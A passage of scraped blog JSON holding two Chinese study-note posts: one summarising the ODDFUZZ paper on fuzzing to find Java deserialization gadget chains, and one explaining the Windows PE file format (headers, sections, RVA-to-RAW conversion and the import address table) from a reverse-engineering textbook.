depth-bounded call tree，删除infeasible gadget chains\n但是对于Java来说 所有的依赖和库都在一起，因此call tree很深，很难处理\n\nB challenge 2：Structured Input ConstructionQ：以Figure1为例，正常构建的时候，我需要构建类，并且给类的属性填上我想给他的值\n\n那么这就需要\n了解注入对象的类的层次结构\n需要注入合适的属性\n\n\n但是传统的fuzz不能对整个调用链进行fuzz，因为很难知道每个injected object后面复杂的结构\n\nQ：解决嵌套对象结构的一个有效方法是generation-based fuzz\n\nSerHybrid利用指针分析去生成一个heap access path\n从heap graph来说，这会满足到达security-sensitive call site的data-flow constraints\n对于没有出现在heap path的field properties，使用fuzz assign random values\n根据他们的type生成有效的注入对象\n\n\n\nQ：但是很难\n\n因为对于Comperator来说，你不太可能从众多接口中找到TransformingComparator来传给他\n\n\nQ：FUGIO构建了一个property tree基于调用链\n总结：对于复杂的类的层次结构，需要一种合理的方法感知它的结构，给他注入合理的值。\nC Challenge 3:Target-Directed FuzzingQ：对于Code-Coverage fuzzing来说，显然不适合现在的情况\n\n对于下面这段代码，如果是Code-Coverage fuzzing，那么如果comparator是null，它会被当成是Interesting seed，被用到下一轮循环中，因为它触发了新的代码片段\n但是实际上它并没有到达敏感方法的call site\n所以这个其实是无意义的，\n所以code-coverage导向不行\n\n\nQ：DFG\n\n如果一个seed的exection trace接近目标site，他会提高整个seed的优先级\n\nQ：State-of-the-art directed fuzzers\n\n计算seed execution trace中所有basic block的平均距离来选择和调度种子，来快速到达target site\n\nQ：但是这可能有问题\n\n即使你找到了一个最短的距离，可能它也不是调用链\n因为不是每个basic block都固定执行你期待的调用链上的方法\n\n总结：重要的是需要有一种target-directed fuzzing feedback，能够有效评估生成的injection object的质量\nODDFUZZ DESIGNA Overview\nInput：program under testing的compiled file\nIndetifier：轻量级的污点分析\nValidator：\n\n基于Identifier生成的调用链，生成一个structure-aware的seed\n\nfuzzing loop：结合step-forward mutation strategy和hybrid feedback(seed distance and gadget coverage)让fuzzer朝着目标sink去突变，生成Injection object\n当inject object到达sink的时候，暴出调用链\nB Taint AnalysisQ：构建调用链的关键\n\n一个taint object能否从entry point(source)传到security-sensitivie call site(sink)\n也就是有一条从source到sink 的call path\n\nQ：直接的方法是构建Call graph\n\n但是由于Java的运行时多态，不能通过declared type确定类型\n\nMethod Summary Computationoddfuzz计算在PUT路径上所有方法的static summaries，之后用这个构建调用链\nQ：具体步骤\n\n对于每个method，提取所有的arguments和this，作为method summary\n\n为了追踪在每个方法variable之间信息的传播，集中于四种statements，因为污点分析经常用这四个：\n\nassign\nload\nstore\ncall\n\n（这不是课上讲的么）\n\n依赖于方法的argument的数据也算method summary\n\n因为上面这些就是攻击者会构造的数据\n\n\nGadet Chain IdentificationQ：调用链的构成\n\n调用链是一系列方法的调用，从一个magic method到security-sensitive call site\n\nQ：ODD\n\nODD应该specify magic method和security-sensitive call site\n识别调用链基于之前的method summray\n足总和specify了16个magic method和30个security-sensitive call site，在附录A\n\n&#x3D;&#x3D;那这里的magic method就相当于source，security-sensensitive call site相当于sink？&#x3D;&#x3D;\nQ：采用的算法\n\nGadgetInspector基于BFS搜索，会跳过infeasible path,即使这个路径上有可能会被利用的方法，因此会导致漏报\n一旦在PUT上发现了一个magic method，oddfuzz会执行DFS，基于之前提到的summary(就是方法的参数)，我觉得其实也就是看变量流到哪，去把可能的链接在一起\n为了避免这个infinite loop，设置了一个长度的最大值\n\n\n为了处理Java的多态问题，对call statement用CHA，避免路径爆炸，把所有的路径都处理\n对于一个方法调用,r = x.k(a,...)，Fig.1中的12行，comparator.compare，如果comparator是污点对象，会把所有compare的重写方法都加入到worklist中。\n\n\n\n&#x3D;&#x3D;啥是CG-based taint analyzer&#x3D;&#x3D;\n\n\n当路径长度达到限制的最大值，或者达到sink方法的时候，这个过程就会停止了\n\n当所有的路径从magic methods 到sensitive call site被分析完之后\n\n会用validator模块进行验证，&#x3D;&#x3D;validator是啥&#x3D;&#x3D;\n\n这种方法具有很好的effectiveness和scalability\n\n\nC Structer-aware Greybox Fuzzing对于一个Java application和一个candicate 调用链，oddfuzz构建结构感知的定向灰喝测试，生成注入对象。\n主要的fuzzing loop 是算法1，由下面三部分组成：\nStructured Seed Genaration首先看前面提到的：\n\n\n两个主要的痛点是：\n需要搞明白类的层次结构\n需要注入合适的sub-object，让他能到达sink\n\n\n对于复杂的对象结构，需要精心设计属性\n\n**Q：为了解决上面的问题，作者用了property tree **\n\nroot node代表一个class object，可以包含一个或多个调用链\n\nleaf node代表class field，包含属性property和名字name\n\n\n看上面这个图，看一下是如何用反射具体构造对象和他的属性的。\n\n两个树merge到一起的条件：\n\n如果一个property tree的field node的property是一个对象，这个对象属于其他的property tree，并且这个新的property tree是这个链子中的下一个节点，那就把这两个Tree merge到一起。\n在PriorityQueue这个tree中，Comparator是一个接口，并且他被TransformingComparator实现了(参考图1)，这两个tree也会merge，通过链接Comparator和Trasforming Comparator\n\n\n迭代的把调用链上的所有的tree merge到一起，直到不再有孤立的sub tree。\n\n\nQ：污点分析和property tree的结合(这部分也就是结构感知的内容)\n\n当用前面的污点分析发现一条调用链之后，就会把他输入给生成器，去构造一个属性的tree\n然后就会找树的各个根节点，把他初始化成一个注入对象用于fuzzing。也就是Fig 7中右边的部分。其他的属性，没有后继节点的(例如Object[] queue)就会被设置成null。可以看到comparator被设置成了t1\n\nSeed Prioritization via Hybrid Feedback\n利用上面的property tree处理复杂的嵌套，成功构建了可利用的注入对象\n\n前面提到的关键是：需要一个目标导向的定向灰盒模糊测试\n\n也就是需要让seed逐渐的接近目标，并且执行距离很短\n\n这意味着随机生成并且mutate 一个注入的对象，可能并不会朝着sink去，因为对象的属性非常多\n\n这可能导致浪费时间在unreachable path上\n\n&#x3D;&#x3D;是因为是动态的，不知道下一个方法在哪么》&#x3D;&#x3D;\n\n\nQ：为了解决select and schedule种子到达调用链的security-sensitive site的问题\noddfuzz采用下面两种feedback指标\n\nseed distance：计算seed distance，并优先调度到达目标sink的种子，一个seed s到sink所在的basic block的距离，如下\n\n\n一个在执行路径上的种子s所在的basic block m到目标基本块Tb的距离\n这里并不就算所有 的basic block，而是收集调用链上的block ξ(s)\n\n\ngadget coverage：如果一个seed覆盖了调用链上的更多方法，就提高他的优先级\n\nIn the initial fuzzing stage, the gadget coverage aims at guiding the fuzzer to select and prioritize diverse seeds,avoiding getting stuck in local optimum caused by favoring certain seeds with specific execution paths\ngadget 覆盖率是在fuzzing的最初阶段引导fuzzer去选择和优化不同的seed,避免陷入由某些种子执行特定的path而导致的局部最优\n\n&#x3D;&#x3D;意思是不图更快到达sink，而是要覆盖链上的更多方法？&#x3D;&#x3D;\n\n\n\n在power scheduling阶段， the gadget coverage attempts to give seeds with the same distance but covering more branches higher chances for mutation.\n\n\nQ：把上面的工作形式化，具体说明\n\n将所有生成的seed按照升序sort，维持一个two-level的优先级队列\n\n一个种子(相同distance但是coverage不同的)会被放到favored-queue，其他的seed放到less favored queue\n\n更可能从favored-queue中选择下一个种子进行mutation\n\n对于power schedule,使用seed distance和gagdet coverage去给选择的种子一个proper energy\n\n$\\psi$ (s) 表示一个seed覆盖的分支比例，对于所有的分支来说\n$\\tilde d$ ，min是最小距离\n\n\n\n利用上面这个公式，fuzzer可以决定应用到现在的seed的mutation chance的数量，决定是否突变的种子是否是favored\n\n也就是这个当前种子的覆盖率越高，下一轮依据他再生成新的种子\n\n\n\n\nStep-forward Seed Mutation之前的fuzz通过bit flips(位翻转)来生成新的input\nQ：之前的问题 \n\nbit-level mutations may lead to invalid syntax(语法无效) when applied to structured inputs\n\nQ：本文做法\n\n利用JQF： maps the structured inputs to a sequence of untyped bits (i.e., parameters), to mutate thegenerated seeds at the bit-level.\n这些在参数上的bit-level的mutation，和在structured injection objects的property-level mutations相关\n之后使用step-forward策略引导seed朝着sensitive call的方向\n\nQ：具体做法\n\n首先遍历要注入对象的property tree，检查每个property的type\n对于原始数据类型(如布尔型、int型)，fuzzer使用JQF提出的多个伪随机方法将untyped的bit参数转换为随机的typed value。\nFor the reference data types,(引用类型)，为特定类型定制template\n对于class，利用random.choose随机选择一个sub-class\n对于array，使用random.nextInt()随机设置数组大小，基于element的type，assign随机的值\n\n\n\nQ：具体的Mutation例子\n\n对于size的mutation，它是Int类型，会用 random.nextInt() 生成一个随机的整数1\n对于object[]  queue，调用random.choose()从预定义的dictionary中给他assign一个Object实例\n这个dictionary由一些具体的属性值组成，例如(class object、string object)和在candidate gadget chai那种所有的classes和methods\n\n\n\nQ：为了引导fuzz朝着目标sink方向前进\n\n在Bit-level上，逐个mutate注入对象的嵌套子对象\n使用random.nextBool() i方法在注入对象的参数序列中插入额外的indentifier bytes\n\n\n当fuzzer在遍历property tree时，遇到一个class object node，添加一个byte作为identifier，标记是否mutate这个嵌套子对象的property value\n当在某个branch卡住的时候，就会设置identifier为true，给参数assign一个随机的值，对这个被卡住的类属性，进行结构化的mutation，产生新的输入\n\n\n问题\n前面黄色部分\n还有就是它是如何处理Java运行时多态的呢？- 是因为他用了前人的方法+特殊的处理么\n\n","slug":"ODDFUZZ-SP-2023","date":"2023-11-07T02:18:56.000Z","categories_index":"","tags_index":"论文,Fuzz","author_index":"XyM4ster"},{"id":"1e07b60d2029aa2ea6483727894829df","title":"re-engineer-core-principle-02","content":"引言\n开启《逆向工程核心原理》的第二部分，冲冲冲！\n\n0x13 PE文件格式13.1 介绍PE(Portable excutable)是Windows操作系统下使用的可执行文件格式。\nPE文件指的是32位的可执行文件，也成为PE32。64位的可执行文件称为PE+或PE32+，是PE文件的扩展形式。\n13.2 PE文件格式\nQ1：notpad头\n严格地说，OBJ(对象)文件之外的所有文件都是可执行的。\nDLL、SYS文件等虽然不能直接在Shell(Explorer.exe)中运行，但可以使用其他方法(调试器、服务等)执行。\n图13-1是notepad.exe文件的起始部分也是PE文件的头部分(PE header)。notepad.exe文件运行需要的所有信息就存储在这个PE头中，如何加载到内存、从何处开始运行、运行中需要的DLL有哪些、需要多大的栈&#x2F;堆内存等，大量信息以结构体形式存储在PE头中。换言之，学习PE文件格式就是学习PE头中的结构体。\nQ2：PE加载到内存\n\n从DOS头(DOS header)到节区头(Section header)是PE头部分，其下的节区合称PE体。\n\n文件中使用偏移 (offset)，内存中使用VA ( Virtual Address，虚拟地址)来表示位置。\n\n文件加载到内存时，情况就会发生变化(节区的大小、位置等)。文件的内容一般可分为代码(.text)、数据(.data)、资源(.rsrc)节，分别保存。\n\n各节区头定义了各节区在文件或内存中的大小、位置、属性等.PE头与各节区的尾部存在一个区域，称为NULL填充(NULL padding)。计算机中，为了提高处理文件、内存、网络包的效率，使用最小基本单位这一概念，PE文件中也类似。\n\n文件&#x2F;内存中节区的起始位置应该在各文件&#x2F;内存最小单位的倍数位置上，空白区域将用NULL填充(看图13-2，可以看到各节区起始地址的截断都遵循一定规则)。\n\n\n\n13.2.2 VA&amp;RVAVA指的是进程虚拟内存的绝对地址，RVA(Relative Virtual Address，相对虚拟地址)指从某个基准位置(Image Base)开始的相对地址。\nVA与RVA满足下面的换算关系：                                            RVA+ImageBase=VAPE头内部信息大多以RVA形式存在。原因在于:（就是修改位置用相对地址会比较简单）\n\nPE文件(主要是DLL)加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件(DLL)。此时必须通过重定位(Relocation将其加载到其他空白的位置，若PE头信息使用的是VA，则无法正常访问。\n因此使用RVA来定位信息，即使发生了重定位，只要相对于基准位置的相对地址没有变化，就能正常访问到指定信息不会出现任何问题。\n\n\n\n\n\n\n\n提示\n32位WindowsOS中各进程分配有4GB的虚拟内存，因此进程中VA值的范围是00000000~FFFFFFFF。\n1 字节（Byte）&#x3D; 8 位（Bit）1 千字节（KB）&#x3D; 1024 字节1 兆字节（MB）&#x3D; 1024 KB1 吉字节（GB）&#x3D; 1024 MB1 太字节（TB）&#x3D; 1024 GB\n\n\n13.3 PE头PE头中有许多结构体，主要学的是这些结构体\n13.3.1 DOS头Q1：为什么会有DOS头\n\n微软创建PE文件格式时，人们正广泛使用DOS文件，所以微软充分考虑了PE文件对DOS文件的兼容性。\n其结果是在PE头的最前面添加了个IMAGE DOS HEADER结构体，用来扩展已有的DOS EXE头。\n\n\nWORD 是一个用于表示无符号的16位整数类型。\n在结构体中两个重要的成员：\n\ne_magic：DOS签名(signature，4D5A&#x3D;&gt;ASCII值“MZ”)。\ne_lfanew：指示NT头的偏移(根据不同文件拥有可变值)。\n\n所有PE文件在开始部分(e_magic)都有DOS签名(“MZ”)。e_lfanew值指向NT头所在位置NT头的名称为IMAGE_NT_HEADERS，后面将会介绍)。\n\n\n\n\n\n\n提示\n签名叫MZ的原因是DOS可执行文件是一个叫MZ的人开发的。\n\n\n打开上面的notpad.exe，查看IMAGE_DOS_HEADER结构体\n\n\n\n开始是4D5A\ne_lfanew的值是000000E0\n\n\n\n\n\n\n\n提示\nIntel系列的CPU采用小端序，因此是逆序存储\n\n\n13.3.2 DOS存根DOS存根(stub)在DOS头下方，是个可选项，且大小不固定(即使没有DOS存根，文件也能正常运行)。\nDOS存根由代码与数据混合而成，图13-4显示的就是notepad.exe的DOS存根。\n\n\n\n上图中文件偏移40~4D区域为16位的汇编指令。\n32位的Windows OS中不会运行该命令(由于被识别为PE文件，所以完全忽视该代码)。\n在DOS环境中运行Notepad.exe文件，或者使用DOS调试器(debug.exe)运行它，可使其执行该代码(在dos环境中，不认识PE文件格式，所以被识别为DOS EXE文件)\n\n把40~4D区域在dos中转换为汇编代码\n\n\n代码非常简单，在画面中输出字符串“This program cannot be run in DOS mode”后就退出。\n换言之，notepad.exe文件虽然是32位的PE文件，但是带有MS-DOS兼容模式，可以在DOS环境中运行，执行DOS EXE代码，输出“This program cannot be run in DOS mode”后终止。\n灵活使用该特性可以在一个可执行文件(EXE)中创建出另一个文件，它在DOS与Widows中都能运行(在DOS环境中运行16位DOS代码，在Windows环境中运行32位Windows代码)。\n如前所述，DOS存根是可选项，开发工具应该支持它(VB、VC+、Dephi等默认支持DOS存根)。\n\n13.3.3 NT头（IMAGE_NT_HEADERS）\nIMAGE_NT_HEADERS结构体由3个成员组成，\n\n第一个成员为PE签名(Signature)结构体，其值为50450000h(“PE”00)\n另外两个成员分别为文件头(FileHeader)与可选头(OptionalHeader)结构体。\n\n该结构体的大小为F8\nPE Signature\npe签名\n\nNT头：文件头（FileHeader）文件头是表现文件大致属性的IMAGE_FILE_HEADER结构体。\n\nIMAGE_FILE_HEADER结构体有4种重要成员：\nMachine\n每个CPU都拥有唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C。\nNumberOfSections\n前面提到过，PE文件把代码、数据、资源等依据属性分类到各节区中存储。\nNumberOfSections用来指出文件中存在的节区数量。\n该值一定要大于0，且当定义的节区数量与实际节区不同时，将发生运行错误。\nSizeOfOptionalHeaderIMAGE_NT_HEADER结构体的最后一个成员为IMAGE_OPTIONAL_HEADER32结构体。\n\nSizeOfOptionalHeader成员用来指出IMAGE OPTIONAL HEADER32结构体的长度。\nIMAGE_OPTIONAL_HEADER32结构体由C语言编写而成，故其大小已经确定。\n但是Windows的PE装载器需要查看IMAGE_FILE_HEADER的SizeOfOptionalHeader值，从而识别出IMAGE_OPTIONAL_HEADER32结构体的大小。\n\nPE32+格式的文件中使用的是IMAGE OPTIONAL HEADER64结构体，而不是IMAGE_OPTIONAL_HEADER32结构体。2个结构体的尺寸是不同的，所以需要在SizeOfOptionalHeader成员中明确指出结构体的大小。:::tip借助IMAGE_DOS_HEADER的elfanew 成员和IMAGE_FILE_HEADER的SizeOfOptionalHeader 成员，可以创建出一种脱离常规的 PE文件(PE Patch)(也有人称之为“麻花”PE文件)。\n:::\nCharacteristics\n该字段用于标识文件的属性，文件是否是可运行的形态、是否为DLL文件等信息，以bit OR形式组合起来。以下是定义在winnt.h文件中的Characteristics值(请记住0002h与2000h这两个值)。\n\nQ：另外，PE文件中Characteristics的值有可能不是0002h吗(不可执行)?\n\n是的，确实存在这种情况。比如类似*.obj的object文件及resource DLL文件等。\n\nTimeDateStamp\n最后讲一下IMAGE_FILE_HEADER的TimeDateStamp成员。该成员的值不影响文件运行，用来记录编译器创建此文件的时间。但是有些开发工具(VB、VC++)提供了设置该值的工具，而有此开发工具(Delphi)则未提供(随所用选项的不同而不同)。\nImage_File_Header\n\nOptionalHeaderIMAGE_OPTIONAL_HEADER32是PE头结构体中最大的。\n\n重点关注上图中红点标记的\nMagic\n\n为IMAGE_OPTIONAL_HEADER32结构体时，Magic码为10B;\n为IMAGE_OPTIONAL_HEADER64结构体时，Magic码为20B。\n\nAddressOfEntryPoint\n\nAddressOfEntryPoint持有EP的RVA值。该值指出程序最先执行的代码起始地址，相当重要\n\nImageBase\n\n进程虚拟内存的范围是O~FFFFFFFF(32位系统)。PE文件被加载到如此大的内存中时,ImageBase指出文件的优先装入地址。\n\nEXE、DLL文件被装载到用户内存的0 -  7FFFFFFF中\n\nSYS文件被载入内核内存的80000000~FFFFFFFF中。\n\n一般而言，使用开发工具(VB&#x2F;VC++&#x2F;Delphi)创建好EXE文件后，其ImageBase的值为00400000，DLL文件的ImageBase值为10000000(当然也可以指定为其他值)。\n\n执行PE文件时，PE装载器先创建进程，再将文件载入内存，然后把EIP寄存器的值设置为ImageBase+AddressOfEntryPoint。\n\n\nSectionAlignment，FileAlignment\n\nPE文件的Body部分划分为若干节区，这些节存储着不同类别的数据。\nFileAlignment指定了节区在磁盘文件中的最小单位，而SectionAlignment则指定了节区在内存中的最小单位(一个文件中FileAlignment与SectionAlignment可能相同，也可能不同)。\n磁盘文件或内存的节区大小中必定为FileAlignment与SectionAlignment的值整数倍。\n\nSizeOflmage\n\n加载PE文件到内存时，SizeOfImage指定了PE Image在虚拟内存中所占空间的大小。\n\n一般而言，文件的大小与加载到内存中的大小是不后的(节区头中定义了各节装载的位置与占有内存的大小，后面会讲到)。\n\n\nSizeOfHeader\n\nSizeOfHeader用来指出整个PE头的大小。该值也必须是FileAlignment的整数倍。第一节区所在位置与SizeOfHeader距文件开始偏移的量相同。\n\nSubsystem\n\n该Subsystem值用来区分系统驱动文件(*.sys)与普通的可执行文件(*exe,*dll)。Subsystem成员可拥有的值如表13-2所示\n\n\nNumberOfRvaAndSizes\n\nNumberOfRvaAndSizes用来指定DataDirectory(IMAGE_OPTIONAL_HEADER32结构体的最后一个成员)数组的个数。\n\n虽然结构体定义中明确指出了数组个数为IMAGE_NUMBEROF_DIRECTORY_ENTRIES(16)，但是PE装载器通过看\nNumberOfRvaAndSizes值来识别数组大小\n\n\n换言之，数组大小也可能不是16。\n\n\nDataDirectory\nDataDirectory是由IMAGE_DATA_DIRECTORY结构体组成的数组，数组的每项都有被定义的值。代码13-7列出了各数组项。\n\n\n将此处所说的Directory想成某个结构体数组即可。希望各位重点关注标红的EXPORT&#x2F;IMPORT&#x2F;RESOURCE、TLS Direction。\n\n特别需要注意的是IMPORT与EXPORT Directory，它们是PE头中非常重要的部分，后面会单独讲解。\n\n其余部分不怎么重要，大致了解一下即可。\n\n\nIMAGE_OPTIONAL_HEADER\n13.3.6 节区头节区头中定义了各节区属性。\nQ1：前面提到过，PE文件中的code(代码)data(数据)resource(资源)等按照属性分类储在不同节区，这是为什么？\n把PE文件创建成多个节区结构的好处是，这样可以保证程序的安全性。\n\n若把code与data放在一个节区中相互纠缠(实际上完全可以这样做)很容易引发安全问题，即使忽略过程的烦琐。\n假如向字符串data写数据时，由于某个原因导致溢出(输入超过缓冲区大小时)那么其下的code(指令)就会被覆盖，应用程序就会崩溃。\n因此PE文件格式的设计者们决定把具有相似属性的数据统一保存在一个被称为“节区”的地方，然后需要把各节区属性记录在节区头中。\n节区属性中有文件&#x2F;内存的起始位置、大小、访问权限等。\n换言之，需要为每个code&#x2F;data&#x2F;resource分别设置不同的特性、访问权限等，如表13-3所示。\n\n\nIMAGE_SECTION_HEADER\n节区头是由IMAGE_SECTION_HEADER结构体组成的数组，每个结构体对应一个节区。\n\n\nVirtualAddress与PointerToRawData不带有任何值，分别由(定义在IMAGE_OPTIONAL_HEADER32中的)SectionAlignment与FileAlignment确定。\nVirtualSize与SizeOfRawData一般具有不同的值，即磁盘文件中节区的大小与加载到内存中的节区大小是不同的。\nCharacterisitics由代码13-10中显示的值组合(bitOR)而成\n\n最后谈谈Name字段。Name成员不像C语言中的字符串一样以NULL结束，并且没有“必须使用ASCII值”的限制。PE规范未明确规定节区的Name，所以可以向其中放入任何值，甚至可以填充NULL值。所以节区的Name仅供参考，不能保证其百分之百地被用作某种信息(数据节区的名称也可叫做code)。\n\n\n\n\n\n\n提示\n讲解 PE 文件时经常出现“映像”(Image)这一术语，希望各位牢记。PE 文件加载到内存时，文件不会原封不动地加载，而要根据节区头中定义的节区起始地址、节区大小等加载。因此，磁盘文件中的 PE与内存中的 PE具有不同形态。将装载到内存中的形态称为“映像”以示区别，使用这一术语能够很好地区分二者。\n\n\n13.4 RVA to RAW理解了节区后，下面讲解有关PE文件从磁盘到内存映射的内容。PE文件加载到内存时，每个节区都要能准确完成内存地址与文件偏移间的别这种映射一般称为RVA to RAW，方法如下。\n\n查找RVA所在节区。\n使用简单的公式计算文件偏移(RAW)\n\n根据IMAGES_SECTION_HEADER结构体，换算公式如下\nRAW- PointerToRawData &#x3D; RVA- VirtualAddress\n&#x2F;&#x2F;RVA 内存地址\n&#x2F;&#x2F;RAW 文件偏移\n&#x2F;&#x2F;PointerToRawData 磁盘文件节区的起始位置\n&#x2F;&#x2F;virtualAddress 内存中节区起始地址\n\nQuiz\n\nRVA&#x3D;5000时，File Offset&#x3D;？\n根据前面的图，5000在.text节区，所以5000-1000+0400&#x3D;4400\n\nRVA&#x3D;ABA8时，FIle Offset&#x3D;？\n由内存图可知，在.data区。ABA8-9000+7C00&#x3D;97A8\n但是97A8已经在.rsrc区了，所以无法定义。\n\n\n13.5 IAT刚开始学习PE头时，最难过的一关就是IAT (Import Address Table，导人地址表)。\nIAT保存的内容与Windows操作系统的核心进程、内存、DLL结构等有关。\nIAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。\n\nIAT和INT都是IMAGE_IMPORT_DESRIPTOR结构体的属性\n\n13.5.1 DLLDLL：Dynamic Linked Library 动态链接库\n16位的操作系统中没有DLL。\nQ1：在16位操作系统中使用Printf()函数，编译器怎么做？\n\n编译器会先从C库中读取相应函数的二进制代码，然后插人(包含到)应用程序。\n也就是可执行文件中包含着printf()函数的二进制代码。\n\nQ2：但是这样显然有问题\n\nWindows OS支持多任务，若仍采用这种包含库的方式，会非常没有效率。\nWindows操作系统使用了数量庞大的库函数(进程、内存、窗口、消息等)来支持32位的Windows环境。同时运行多个程序时，若仍像以前一样每个程序运行时都包含相同的库，将造成严重的内存浪费(当然磁盘空间的浪费也不容小觑)。\n\nQ3：WindowsOS设计者们根据需要引人了DLL这一概念\n\n不要把库包含到程序中，单独组成DLL文件，需要时调用即可。\n内存映射技术使加载后的DLL代码、资源在多个进程中实现共享。\n更新库时只要替换相关DLL文件即可，简便易行。\n\nQ4：加载DLL的方式\n\n显式链接(EXplicit Linking)：程序使用DLL时加载，使用完毕释放内存\n隐式链接(Implicit Linking)：程序开始时一同加载DLL，程序终止时再释放占用的内存\n\n使用Ollydbg打开notepad.exe来查看IAT\n\n这里看到了调用CreateFileW的代码，该函数位于kernel32.dll中\n这里发现使用CreateFileW时，并没有直接调用，而是先调用01001104这个地址。所有API都采用这种方式\nQ5：为什么不直接调用？\n原因1：\n\n事实上，notepad.exe程序的制作者编译(生成)程序时，并不知道该notepad.exe序要运行在哪种Windows(9X\\2K、XP、Vista 7)、哪种语言(ENG、JPN、KOR等)、哪种服务包( ServicePack)下。\n上面列举出的所有环境中，kernel32.dl的版本各不相同，CreateFilew()函数的位置(地址)也不相同。\n为了确保在所有环境中都能正常调用CreateFilew()函数，编译器准备了要保存CreateFilew()函数实际地址的位置(01001104)并仅记下CALL DWORD PTR DS:1004404形式的指令。\n执行文件时，PE装载器将CreateFilew()函数的地写到01001104位置。\n\n原因2：\n\nDLL文件的ImageBase值一般为10000000。\n当某个程序使用a.dll与b.dll时，PE装载器先把a.dll装载到内存的1000000 (ImageBase)处\n然后尝试把b.dll也装载到该处。但是由于该地址处已经装载了a.dll，所以PE装载器查找其他空白的内存空间 (ex:3E000000)，然后将b.dll装载进去。\n这就是所谓的DLL重定位，它使我们无法对实际地址硬编码。\n另一个原因在于，PE头中表示地址时不使用绝对地址(VA)，而是相对地址RVA。\n\n\n\n\n\n\n\n提示\n实际操作中无法保证DLL一定会被加载到PE头内指定的ImageBase处。但是EXE文件(生成进程的主体)却能准确加载到自身的 ImageBase 中，因为它拥有自己的虚拟空间。\n\n\n13.5.2 IMAGE_IMPORT_DESCRIPTORIMAGE_IMPORT_DESCRIPTOR结构体中记录着PE文件要导人哪些库文件。\n\n\n\n\n\n\n提示\nImport:导入，向库提供服务(函数)。Export:导出，从库向其他PE文件提供服务(函数)。\n\n\nQ1：IMAGE_IMPORT_DESCRIPTOR结构体\n\n\n执行一个普通程序时往往需要导入多个库，导人多少库就存在多少个IMAGE_IMPORT_DESCRIPTOR结构体\n\n这些结构体形成了数组，且结构体数组最后以NULL结构体结束。\n\nIMAGE IMPORTDESCRIPTOR中的重要成员如表13-5所示(拥有全部RVA值)。\n\n\nPE头中提到的“Table”即指数组。\n\nINT与IAT是长整型(4个字节数据类型)数组，以NULL结束(未另外明确指出大小)。\n\nINT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针(有时IAT也拥有相同的值 )。\n\nINT与IAT的大小应相同。\n\n\n\n上图中，INT与IAT的各元素同时指向相同地址，但是也有很多情况下不一样。\nQ2：PE装载器把导入函数输入至IAT的顺序\n\n读取IID的Name成员，获取库名称字符串”kernel32.dll”\n装载相应库。LoadLibrary(“kernel32.dll”）\n读取IID的OriginalFirstThunk成员，获取INT地址\n逐一读取INT中数组的值，获取相应IMAGE_IMPORT_BY_NAME地址(RVA)\n使用IMAGE_IMPORT_BY_NAME的Hint(ordinal)或Name项，获取相应函数的起始地址GetProcAddress(“GetCurrentThreadld”)\n读取IID的FirstThunk(IAT)成员，获得IAT地址\n将上面获得的函数地址输入相应IAT数组值。\n重复以上步骤4~7，直到INT结束(遇到NULL时)。\n\n13.5.3 使用notepad.exe练习Q1：IMAGE_IMPORT_DESCRIPTOR结构体数字在PE文件中的哪个部分？\n\n它不在PE头而在PE体中，但查找其位置的信息在PE头中。\nIMAGE_OPTIONAL_HEADER32.DataDirectory[1].VirtualAddress的值即是IMAGE_IMPORT_DESCRIPTOR结构体数组的起始地址(RVA值)。\nIMAGE_IMPORT_DESCRIPTOR结构体数组也被称为IMPORT Directory Table\n\n\n\n\n\n\n\n提示\n这是前面optionalHeader中关于DataDirectory的笔记。\n\n\n\nQ2：IMAGE_OPTIONAAL_HEADER32.DataDirectory结构体数组\n\n\n由于RVA是7604，可以计算得到文件偏移位6A04\n\n\n\n粗线框是数组的第一个元素，也就是IMAGE_IMPORT_DESCRIPTOR\n数组的最后是NULL结构体\n\nQ3：粗线框中IMAGE_IMPORT_DESCRIPTOR结构体的各个成员\n\n\n库名称Name\n\n\nName是一个字符串指针，它指向导入函数所属的库文件名称。在图13-14的文件偏移6EAC(RVA:7AAC-&gt;RAW:6EAC)处看到字符串comdlg32.dIl\n\n\n\n\nOriginalFirstThunk–(INT)\n\n\nINT是一个包含导人函数信息 (Ordinal，Name)的结构体指针数组。\n\n只有获得了这些信息,才能在加载到进程内存的库中准确求得相应函数的起始地址(请参考后面EAT的讲解)。\n\n跟踪OriginalFirstThunk成员(RVA:7990—&gt;RAW:6D90)。\n\n\n图13-15是INT，由地址数组形式组成(数组尾部以NULL结束 )。\n\n\n每个地址值分别指向IMAGE_IMPORT_BY_NAME结构体(参考图13-11)。\n\n跟踪数组的第一个值7A7A(RVA)进入该地址，可以看到导入的API函数的名称字符串。\n\n\n\nIMAGE_IMPORT_BY_NAME\n\n\nRVA:7A7A即为RAW:6E7A。\n文件偏移6E7A最初的2个字节值(000F)为Ordinal，是库中函数的固有编号。\nOrdinal的后面为函数名称字符串PageSetupDlgW\n同C语言一样，字符串末尾以TerminatingNULL[‘\\0’]结束)\n\nQ：这个值是干啥用的？\n\n也就是上面INT数组的每个指针，都指向了一个IMAGE_IMPORT_BY_NAME结构体\n\n参考下图，数组的第一个元素指向函数的Ordinal值000F后面函数的名称为PageSetupDlgW。\n\n\n\n\nFirstThunk-IAT（Import Access Table）\n\n\n根据上表，IAT的RVA：12C4也就是RAW：6C4\n\n\n\n图13-17中文件偏移6C4~6EB区域即为IAT数组区域，对应于comdlg32.dll库。\n它与INT类似由结构体指针数组组成，且以NULL结尾。\nIAT的第一个元素值被硬编码为76324906，该值无实际意义，notepad.exe文件加载到内存时准确的地址值会取代该值。\n\n\n由于notepad.exe的ImageBase值为01000000，所以config32.dll.PageSetypDlgW是实际地址就是010012C4\n13.6 